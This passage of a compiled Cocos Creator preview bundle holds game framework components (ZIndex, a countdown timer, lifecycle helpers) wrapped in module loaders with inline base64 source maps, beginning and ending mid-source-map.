ZGUpO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHBhcmFtIGRhdGEgY29tbWFuZE5hbWVcclxuICAgICAqICovXHJcbiAgICBhc3luYyBjbG9zZVZpZXdXaXRoQ2xpY2tTb3VuZChldmVudCwgZGF0YSl7XHJcbiAgICAgICAgVmlldy5leGVjdXRlQ2xpY2tTb3VuZENvbW1hbmQoZXZlbnQsIGRhdGEpO1xyXG4gICAgICAgIGF3YWl0IHRoaXMuY2xvc2VWaWV3KGV2ZW50LCBkYXRhKTtcclxuICAgIH1cclxuXHJcbiAgICAvKipcclxuICAgICAqIEBwYXJhbSBkYXRhIHByZWZhYk5hbWVcclxuICAgICAqICovXHJcbiAgICBhc3luYyBvcGVuVmlldyhldmVudCwgZGF0YSl7XHJcbiAgICAgICAgYXdhaXQgRmFjYWRlLmV4ZWN1dGVDb21tYW5kKFwiT3BlblZpZXdDb21tYW5kXCIsIGRhdGEpO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHBhcmFtIGRhdGEgcHJlZmFiTmFtZVxyXG4gICAgICogKi9cclxuICAgIGFzeW5jIG9wZW5WaWV3V2l0aENsaWNrU291bmQoZXZlbnQsIGRhdGEpe1xyXG4gICAgICAgIFZpZXcuZXhlY3V0ZUNsaWNrU291bmRDb21tYW5kKGV2ZW50LCBkYXRhKTtcclxuICAgICAgICBhd2FpdCB0aGlzLm9wZW5WaWV3KGV2ZW50LCBkYXRhKTtcclxuICAgIH1cclxuXHJcbiAgICAvKipcclxuICAgICAqIEBwYXJhbSBkYXRhIHNjZW5lTmFtZVxyXG4gICAgICogKi9cclxuICAgIGFzeW5jIGxvYWRTY2VuZShldmVudCwgZGF0YSl7XHJcbiAgICAgICAgYXdhaXQgRmFjYWRlLmV4ZWN1dGVDb21tYW5kKFwiTG9hZFNjZW5lQ29tbWFuZFwiLCBkYXRhKTtcclxuICAgIH1cclxuXHJcbiAgICAvKipcclxuICAgICAqIEBwYXJhbSBkYXRhIHNjZW5lTmFtZVxyXG4gICAgICogKi9cclxuICAgIGFzeW5jIGxvYWRTY2VuZVdpdGhDbGlja1NvdW5kKGV2ZW50LCBkYXRhKXtcclxuICAgICAgICBWaWV3LmV4ZWN1dGVDbGlja1NvdW5kQ29tbWFuZChldmVudCwgZGF0YSk7XHJcbiAgICAgICAgYXdhaXQgRmFjYWRlLmV4ZWN1dGVDb21tYW5kKFwiTG9hZFNjZW5lQ29tbWFuZFwiLCBkYXRhKTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiBAcGFyYW0gZGF0YSBjb21tYW5kTmFtZVxyXG4gICAgICogKi9cclxuICAgIGFzeW5jIGV4ZWN1dGVDb21tYW5kKGV2ZW50LCBkYXRhKXtcclxuICAgICAgICBhd2FpdCBGYWNhZGUuZXhlY3V0ZUNvbW1hbmQoZGF0YSwgZXZlbnQpO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICogQHBhcmFtIGRhdGEgY29tbWFuZE5hbWVcclxuICAgICAqICovXHJcbiAgICBhc3luYyBleGVjdXRlQ29tbWFuZFdpdGhDbGlja1NvdW5kKGV2ZW50LCBkYXRhKXtcclxuICAgICAgICBWaWV3LmV4ZWN1dGVDbGlja1NvdW5kQ29tbWFuZChldmVudCwgZGF0YSk7XHJcbiAgICAgICAgYXdhaXQgdGhpcy5leGVjdXRlQ29tbWFuZChldmVudCwgZGF0YSk7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIC8qKlxyXG4gICAgICog54K55Ye75oyJ6ZKu5pe25pKt5pS+5aOw6Z+zXHJcbiAgICAgKiAqL1xyXG4gICAgc3RhdGljIGV4ZWN1dGVDbGlja1NvdW5kQ29tbWFuZChldmVudCwgZGF0YSl7XHJcbiAgICAgICAgaWYgKFZpZXcuY2xpY2tTb3VuZENvbW1hbmQpe1xyXG4gICAgICAgICAgICBGYWNhZGUuZXhlY3V0ZUNvbW1hbmQoVmlldy5jbGlja1NvdW5kQ29tbWFuZCwgZXZlbnQsIGRhdGEpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcblxyXG5cclxuXHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/component/ZIndex.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '28376gLYLVAy4MJItNA7L8U', 'ZIndex');
// framework/component/ZIndex.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property, menu = _a.menu;
var ZIndex = /** @class */ (function (_super) {
    __extends(ZIndex, _super);
    function ZIndex() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.zIndex = 0;
        return _this;
    }
    ZIndex.prototype.onLoad = function () {
        if (this.zIndex != 0) {
            this.node.zIndex = this.zIndex;
        }
    };
    __decorate([
        property
    ], ZIndex.prototype, "zIndex", void 0);
    ZIndex = __decorate([
        ccclass,
        menu("自定义/ZIndex")
    ], ZIndex);
    return ZIndex;
}(cc.Component));
exports.default = ZIndex;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29tcG9uZW50L1pJbmRleC50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ00sSUFBQSxLQUE0QixFQUFFLENBQUMsVUFBVSxFQUF4QyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQUEsRUFBRSxJQUFJLFVBQWlCLENBQUM7QUFJaEQ7SUFBb0MsMEJBQVk7SUFBaEQ7UUFBQSxxRUFVQztRQVBHLFlBQU0sR0FBRyxDQUFDLENBQUM7O0lBT2YsQ0FBQztJQUxHLHVCQUFNLEdBQU47UUFDSSxJQUFJLElBQUksQ0FBQyxNQUFNLElBQUksQ0FBQyxFQUFDO1lBQ2pCLElBQUksQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQyxNQUFNLENBQUM7U0FDbEM7SUFDTCxDQUFDO0lBTkQ7UUFEQyxRQUFROzBDQUNFO0lBSE0sTUFBTTtRQUYxQixPQUFPO1FBQ1AsSUFBSSxDQUFDLFlBQVksQ0FBQztPQUNFLE1BQU0sQ0FVMUI7SUFBRCxhQUFDO0NBVkQsQUFVQyxDQVZtQyxFQUFFLENBQUMsU0FBUyxHQVUvQztrQkFWb0IsTUFBTSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHksIG1lbnV9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbkBtZW51KFwi6Ieq5a6a5LmJL1pJbmRleFwiKVxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBaSW5kZXggZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgekluZGV4ID0gMDtcclxuXHJcbiAgICBvbkxvYWQgKCkge1xyXG4gICAgICAgIGlmICh0aGlzLnpJbmRleCAhPSAwKXtcclxuICAgICAgICAgICAgdGhpcy5ub2RlLnpJbmRleCA9IHRoaXMuekluZGV4O1xyXG4gICAgICAgIH1cclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/component/CDTimer.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'c739atlrTdAc4RH4aaUDag6', 'CDTimer');
// framework/component/CDTimer.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property, menu = _a.menu, disallowMultiple = _a.disallowMultiple;
var CDTimer = /** @class */ (function (_super) {
    __extends(CDTimer, _super);
    function CDTimer() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.once = false;
        _this.cd = 0;
        _this.pause = false;
        _this.frameEventHandlers = [];
        _this.zeroEventHandlers = [];
        _this._curTime = 0;
        return _this;
    }
    Object.defineProperty(CDTimer.prototype, "curTime", {
        get: function () {
            return this._curTime;
        },
        enumerable: false,
        configurable: true
    });
    CDTimer.prototype.cdDelta = function () {
        return this.cd - this.curTime;
    };
    CDTimer.prototype.reset = function () {
        this._curTime = 0;
    };
    CDTimer.prototype.update = function (dt) {
        if (this.pause)
            return;
        if (this.cd > 0 && this._curTime < this.cd) {
            this._curTime += dt;
            var progress = this._curTime / this.cd;
            cc.Component.EventHandler.emitEvents(this.frameEventHandlers, progress);
            if (this._curTime >= this.cd) {
                cc.Component.EventHandler.emitEvents(this.zeroEventHandlers, progress);
                if (this.once) {
                    this.destroy();
                }
                else {
                    this.reset();
                }
            }
        }
    };
    __decorate([
        property({ displayName: "是否一次性", textTips: "选是则在倒计时结束会销毁自己" })
    ], CDTimer.prototype, "once", void 0);
    __decorate([
        property({ displayName: "倒计时(秒)" })
    ], CDTimer.prototype, "cd", void 0);
    __decorate([
        property({ displayName: "暂停开关" })
    ], CDTimer.prototype, "pause", void 0);
    __decorate([
        property({ type: cc.Component.EventHandler, displayName: "进度事件", textTips: "每一帧都会收到进度信息" })
    ], CDTimer.prototype, "frameEventHandlers", void 0);
    __decorate([
        property({ type: cc.Component.EventHandler, displayName: "归零事件", textTips: "CD归零时会收到此消息" })
    ], CDTimer.prototype, "zeroEventHandlers", void 0);
    CDTimer = __decorate([
        ccclass,
        disallowMultiple,
        menu("自定义/CDTimer")
    ], CDTimer);
    return CDTimer;
}(cc.Component));
exports.default = CDTimer;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29tcG9uZW50L0NEVGltZXIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNNLElBQUEsS0FBOEMsRUFBRSxDQUFDLFVBQVUsRUFBMUQsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFBLEVBQUUsSUFBSSxVQUFBLEVBQUUsZ0JBQWdCLHNCQUFpQixDQUFDO0FBS2xFO0lBQXFDLDJCQUFZO0lBQWpEO1FBQUEscUVBK0NDO1FBN0NHLFVBQUksR0FBRyxLQUFLLENBQUM7UUFHYixRQUFFLEdBQUcsQ0FBQyxDQUFDO1FBR1AsV0FBSyxHQUFHLEtBQUssQ0FBQztRQUdkLHdCQUFrQixHQUErQixFQUFFLENBQUM7UUFHcEQsdUJBQWlCLEdBQStCLEVBQUUsQ0FBQztRQUczQyxjQUFRLEdBQUcsQ0FBQyxDQUFDOztJQThCekIsQ0FBQztJQTVCRyxzQkFBSSw0QkFBTzthQUFYO1lBQ0ksT0FBTyxJQUFJLENBQUMsUUFBUSxDQUFDO1FBQ3pCLENBQUM7OztPQUFBO0lBRUQseUJBQU8sR0FBUDtRQUNJLE9BQU8sSUFBSSxDQUFDLEVBQUUsR0FBRyxJQUFJLENBQUMsT0FBTyxDQUFDO0lBQ2xDLENBQUM7SUFFRCx1QkFBSyxHQUFMO1FBQ0ksSUFBSSxDQUFDLFFBQVEsR0FBRyxDQUFDLENBQUM7SUFDdEIsQ0FBQztJQUVELHdCQUFNLEdBQU4sVUFBUSxFQUFFO1FBQ04sSUFBSSxJQUFJLENBQUMsS0FBSztZQUFDLE9BQU87UUFDdEIsSUFBSSxJQUFJLENBQUMsRUFBRSxHQUFHLENBQUMsSUFBSSxJQUFJLENBQUMsUUFBUSxHQUFHLElBQUksQ0FBQyxFQUFFLEVBQUM7WUFDdkMsSUFBSSxDQUFDLFFBQVEsSUFBSSxFQUFFLENBQUM7WUFDcEIsSUFBSSxRQUFRLEdBQUcsSUFBSSxDQUFDLFFBQVEsR0FBQyxJQUFJLENBQUMsRUFBRSxDQUFDO1lBQ3JDLEVBQUUsQ0FBQyxTQUFTLENBQUMsWUFBWSxDQUFDLFVBQVUsQ0FBQyxJQUFJLENBQUMsa0JBQWtCLEVBQUUsUUFBUSxDQUFDLENBQUM7WUFDeEUsSUFBSSxJQUFJLENBQUMsUUFBUSxJQUFJLElBQUksQ0FBQyxFQUFFLEVBQUM7Z0JBQ3pCLEVBQUUsQ0FBQyxTQUFTLENBQUMsWUFBWSxDQUFDLFVBQVUsQ0FBQyxJQUFJLENBQUMsaUJBQWlCLEVBQUUsUUFBUSxDQUFDLENBQUM7Z0JBQ3ZFLElBQUksSUFBSSxDQUFDLElBQUksRUFBQztvQkFDVixJQUFJLENBQUMsT0FBTyxFQUFFLENBQUM7aUJBQ2xCO3FCQUFNO29CQUNILElBQUksQ0FBQyxLQUFLLEVBQUUsQ0FBQztpQkFDaEI7YUFDSjtTQUNKO0lBQ0wsQ0FBQztJQTVDRDtRQURDLFFBQVEsQ0FBQyxFQUFDLFdBQVcsRUFBQyxPQUFPLEVBQUUsUUFBUSxFQUFDLGdCQUFnQixFQUFDLENBQUM7eUNBQzlDO0lBR2I7UUFEQyxRQUFRLENBQUMsRUFBQyxXQUFXLEVBQUMsUUFBUSxFQUFDLENBQUM7dUNBQzFCO0lBR1A7UUFEQyxRQUFRLENBQUMsRUFBQyxXQUFXLEVBQUMsTUFBTSxFQUFDLENBQUM7MENBQ2pCO0lBR2Q7UUFEQyxRQUFRLENBQUMsRUFBQyxJQUFJLEVBQUMsRUFBRSxDQUFDLFNBQVMsQ0FBQyxZQUFZLEVBQUUsV0FBVyxFQUFDLE1BQU0sRUFBRSxRQUFRLEVBQUMsYUFBYSxFQUFDLENBQUM7dURBQ25DO0lBR3BEO1FBREMsUUFBUSxDQUFDLEVBQUMsSUFBSSxFQUFDLEVBQUUsQ0FBQyxTQUFTLENBQUMsWUFBWSxFQUFFLFdBQVcsRUFBQyxNQUFNLEVBQUUsUUFBUSxFQUFDLGFBQWEsRUFBQyxDQUFDO3NEQUNwQztJQWRsQyxPQUFPO1FBSDNCLE9BQU87UUFDUCxnQkFBZ0I7UUFDaEIsSUFBSSxDQUFDLGFBQWEsQ0FBQztPQUNDLE9BQU8sQ0ErQzNCO0lBQUQsY0FBQztDQS9DRCxBQStDQyxDQS9Db0MsRUFBRSxDQUFDLFNBQVMsR0ErQ2hEO2tCQS9Db0IsT0FBTyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHksIG1lbnUsIGRpc2FsbG93TXVsdGlwbGV9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbkBkaXNhbGxvd011bHRpcGxlXHJcbkBtZW51KFwi6Ieq5a6a5LmJL0NEVGltZXJcIilcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgQ0RUaW1lciBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcbiAgICBAcHJvcGVydHkoe2Rpc3BsYXlOYW1lOlwi5piv5ZCm5LiA5qyh5oCnXCIsIHRleHRUaXBzOlwi6YCJ5piv5YiZ5Zyo5YCS6K6h5pe257uT5p2f5Lya6ZSA5q+B6Ieq5bexXCJ9KVxyXG4gICAgb25jZSA9IGZhbHNlO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7ZGlzcGxheU5hbWU6XCLlgJLorqHml7Yo56eSKVwifSlcclxuICAgIGNkID0gMDtcclxuXHJcbiAgICBAcHJvcGVydHkoe2Rpc3BsYXlOYW1lOlwi5pqC5YGc5byA5YWzXCJ9KVxyXG4gICAgcGF1c2UgPSBmYWxzZTtcclxuXHJcbiAgICBAcHJvcGVydHkoe3R5cGU6Y2MuQ29tcG9uZW50LkV2ZW50SGFuZGxlciwgZGlzcGxheU5hbWU6XCLov5vluqbkuovku7ZcIiwgdGV4dFRpcHM6XCLmr4/kuIDluKfpg73kvJrmlLbliLDov5vluqbkv6Hmga9cIn0pXHJcbiAgICBmcmFtZUV2ZW50SGFuZGxlcnM6W2NjLkNvbXBvbmVudC5FdmVudEhhbmRsZXJdID0gW107XHJcblxyXG4gICAgQHByb3BlcnR5KHt0eXBlOmNjLkNvbXBvbmVudC5FdmVudEhhbmRsZXIsIGRpc3BsYXlOYW1lOlwi5b2S6Zu25LqL5Lu2XCIsIHRleHRUaXBzOlwiQ0TlvZLpm7bml7bkvJrmlLbliLDmraTmtojmga9cIn0pXHJcbiAgICB6ZXJvRXZlbnRIYW5kbGVyczpbY2MuQ29tcG9uZW50LkV2ZW50SGFuZGxlcl0gPSBbXTtcclxuXHJcblxyXG4gICAgcHJpdmF0ZSBfY3VyVGltZSA9IDA7XHJcblxyXG4gICAgZ2V0IGN1clRpbWUoKTogbnVtYmVyIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5fY3VyVGltZTtcclxuICAgIH1cclxuXHJcbiAgICBjZERlbHRhKCk6bnVtYmVye1xyXG4gICAgICAgIHJldHVybiB0aGlzLmNkIC0gdGhpcy5jdXJUaW1lO1xyXG4gICAgfVxyXG5cclxuICAgIHJlc2V0KCl7XHJcbiAgICAgICAgdGhpcy5fY3VyVGltZSA9IDA7XHJcbiAgICB9XHJcblxyXG4gICAgdXBkYXRlIChkdCkge1xyXG4gICAgICAgIGlmICh0aGlzLnBhdXNlKXJldHVybjtcclxuICAgICAgICBpZiAodGhpcy5jZCA+IDAgJiYgdGhpcy5fY3VyVGltZSA8IHRoaXMuY2Qpe1xyXG4gICAgICAgICAgICB0aGlzLl9jdXJUaW1lICs9IGR0O1xyXG4gICAgICAgICAgICBsZXQgcHJvZ3Jlc3MgPSB0aGlzLl9jdXJUaW1lL3RoaXMuY2Q7XHJcbiAgICAgICAgICAgIGNjLkNvbXBvbmVudC5FdmVudEhhbmRsZXIuZW1pdEV2ZW50cyh0aGlzLmZyYW1lRXZlbnRIYW5kbGVycywgcHJvZ3Jlc3MpO1xyXG4gICAgICAgICAgICBpZiAodGhpcy5fY3VyVGltZSA+PSB0aGlzLmNkKXtcclxuICAgICAgICAgICAgICAgIGNjLkNvbXBvbmVudC5FdmVudEhhbmRsZXIuZW1pdEV2ZW50cyh0aGlzLnplcm9FdmVudEhhbmRsZXJzLCBwcm9ncmVzcyk7XHJcbiAgICAgICAgICAgICAgICBpZiAodGhpcy5vbmNlKXtcclxuICAgICAgICAgICAgICAgICAgICB0aGlzLmRlc3Ryb3koKTtcclxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5yZXNldCgpO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/component/LifeCycle.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'a7c48jInGlJw7oRhT15QWXk', 'LifeCycle');
// framework/component/LifeCycle.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var LifeCycle = /** @class */ (function (_super) {
    __extends(LifeCycle, _super);
    function LifeCycle() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    LifeCycle_1 = LifeCycle;
    LifeCycle.prototype.addCall = function (lifeName, callFunc, callObj) {
        var thatCall = this[lifeName];
        this[lifeName] = function () {
            if (thatCall) {
                thatCall();
            }
            if (callObj) {
                callFunc.call(callObj);
            }
            else {
                callFunc();
            }
        };
    };
    LifeCycle.onDestroyFollow = function (node, followNode) {
        var lifeCycle = followNode.addComponent(LifeCycle_1);
        lifeCycle.addCall("onDestroy", function () {
            if (node.isValid) {
                node.destroy();
            }
        });
    };
    LifeCycle.onDisableFollow = function (node, followNode) {
        var lifeCycle = followNode.addComponent(LifeCycle_1);
        lifeCycle.addCall("onDisable", function () {
            node.active = false;
        });
    };
    LifeCycle.onEnableFollow = function (node, followNode) {
        var lifeCycle = followNode.addComponent(LifeCycle_1);
        lifeCycle.addCall("onEnable", function () {
            node.active = true;
        });
    };
    var LifeCycle_1;
    LifeCycle = LifeCycle_1 = __decorate([
        ccclass
    ], LifeCycle);
    return LifeCycle;
}(cc.Component));
exports.default = LifeCycle;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29tcG9uZW50L0xpZmVDeWNsZS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7QUFBQSxvQkFBb0I7QUFDcEIsaUZBQWlGO0FBQ2pGLHlGQUF5RjtBQUN6RixtQkFBbUI7QUFDbkIsMkZBQTJGO0FBQzNGLG1HQUFtRztBQUNuRyw4QkFBOEI7QUFDOUIsMkZBQTJGO0FBQzNGLG1HQUFtRzs7QUFFN0YsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBdUMsNkJBQVk7SUFBbkQ7O0lBc0NBLENBQUM7a0JBdENvQixTQUFTO0lBRTFCLDJCQUFPLEdBQVAsVUFBUSxRQUFlLEVBQUUsUUFBaUIsRUFBRSxPQUFlO1FBQ3ZELElBQUksUUFBUSxHQUFHLElBQUksQ0FBQyxRQUFRLENBQUMsQ0FBQztRQUM5QixJQUFJLENBQUMsUUFBUSxDQUFDLEdBQUc7WUFDYixJQUFJLFFBQVEsRUFBQztnQkFDVCxRQUFRLEVBQUUsQ0FBQzthQUNkO1lBQ0QsSUFBSSxPQUFPLEVBQUM7Z0JBQ1IsUUFBUSxDQUFDLElBQUksQ0FBQyxPQUFPLENBQUMsQ0FBQzthQUMxQjtpQkFBTTtnQkFDSCxRQUFRLEVBQUUsQ0FBQzthQUNkO1FBQ0wsQ0FBQyxDQUFBO0lBQ0wsQ0FBQztJQUVNLHlCQUFlLEdBQXRCLFVBQXVCLElBQVksRUFBRSxVQUFrQjtRQUNuRCxJQUFJLFNBQVMsR0FBRyxVQUFVLENBQUMsWUFBWSxDQUFDLFdBQVMsQ0FBQyxDQUFDO1FBQ25ELFNBQVMsQ0FBQyxPQUFPLENBQUMsV0FBVyxFQUFFO1lBQzNCLElBQUksSUFBSSxDQUFDLE9BQU8sRUFBQztnQkFDYixJQUFJLENBQUMsT0FBTyxFQUFFLENBQUM7YUFDbEI7UUFDTCxDQUFDLENBQUMsQ0FBQztJQUNQLENBQUM7SUFFTSx5QkFBZSxHQUF0QixVQUF1QixJQUFZLEVBQUUsVUFBa0I7UUFDbkQsSUFBSSxTQUFTLEdBQUcsVUFBVSxDQUFDLFlBQVksQ0FBQyxXQUFTLENBQUMsQ0FBQztRQUNuRCxTQUFTLENBQUMsT0FBTyxDQUFDLFdBQVcsRUFBRTtZQUMzQixJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztRQUN4QixDQUFDLENBQUMsQ0FBQztJQUNQLENBQUM7SUFFTSx3QkFBYyxHQUFyQixVQUFzQixJQUFZLEVBQUUsVUFBa0I7UUFDbEQsSUFBSSxTQUFTLEdBQUcsVUFBVSxDQUFDLFlBQVksQ0FBQyxXQUFTLENBQUMsQ0FBQztRQUNuRCxTQUFTLENBQUMsT0FBTyxDQUFDLFVBQVUsRUFBRTtZQUMxQixJQUFJLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztRQUN2QixDQUFDLENBQUMsQ0FBQztJQUNQLENBQUM7O0lBckNnQixTQUFTO1FBRDdCLE9BQU87T0FDYSxTQUFTLENBc0M3QjtJQUFELGdCQUFDO0NBdENELEFBc0NDLENBdENzQyxFQUFFLENBQUMsU0FBUyxHQXNDbEQ7a0JBdENvQixTQUFTIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIExpZmVDeWNsZSBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgYWRkQ2FsbChsaWZlTmFtZTpTdHJpbmcsIGNhbGxGdW5jOkZ1bmN0aW9uLCBjYWxsT2JqPzpPYmplY3Qpe1xyXG4gICAgICAgIGxldCB0aGF0Q2FsbCA9IHRoaXNbbGlmZU5hbWVdO1xyXG4gICAgICAgIHRoaXNbbGlmZU5hbWVdID0gZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICBpZiAodGhhdENhbGwpe1xyXG4gICAgICAgICAgICAgICAgdGhhdENhbGwoKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICBpZiAoY2FsbE9iail7XHJcbiAgICAgICAgICAgICAgICBjYWxsRnVuYy5jYWxsKGNhbGxPYmopO1xyXG4gICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgY2FsbEZ1bmMoKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgb25EZXN0cm95Rm9sbG93KG5vZGU6Y2MuTm9kZSwgZm9sbG93Tm9kZTpjYy5Ob2RlKXtcclxuICAgICAgICBsZXQgbGlmZUN5Y2xlID0gZm9sbG93Tm9kZS5hZGRDb21wb25lbnQoTGlmZUN5Y2xlKTtcclxuICAgICAgICBsaWZlQ3ljbGUuYWRkQ2FsbChcIm9uRGVzdHJveVwiLCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgIC